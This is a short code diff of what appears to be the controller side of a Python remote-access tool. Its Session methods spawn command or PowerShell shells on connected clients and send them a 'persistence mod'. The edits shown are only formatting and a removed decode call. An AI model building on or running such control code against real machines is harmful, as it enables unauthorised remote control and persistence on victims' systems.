@@ -77,6 +77,7 @@ class Session:
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
         
+
     def spawnShell(self,prog):
         '''--command or --powershell'''
 
@@ -89,6 +90,7 @@ class Session:
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
 
+
     def lonelyPersistence(self):
         '''-p or --persistence'''
         #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
@@ -96,10 +98,9 @@ class Session:
         if(CheckConn().sendsafe(self.session_nb, self.socket, mod_persi)): #send mod persi
             #printColor("information","[+] the persistence mod was sent.\n")
             
-            reponse = CheckConn().recvsafe(self.socket,4096).decode("utf-8","replace")
-
+            reponse = CheckConn().recvsafe(self.socket,4096)
             if(reponse == "\r\n"):#Mod persi ok  
-                printColor("successfully","[+] the persistence mod is well executed with success..\n")
+                printColor("successfully","\n[+] the persistence mod is well executed with success..\n")
             else:
                 printColor("error","[-] the persistence mod could not be executed on the client.")
 
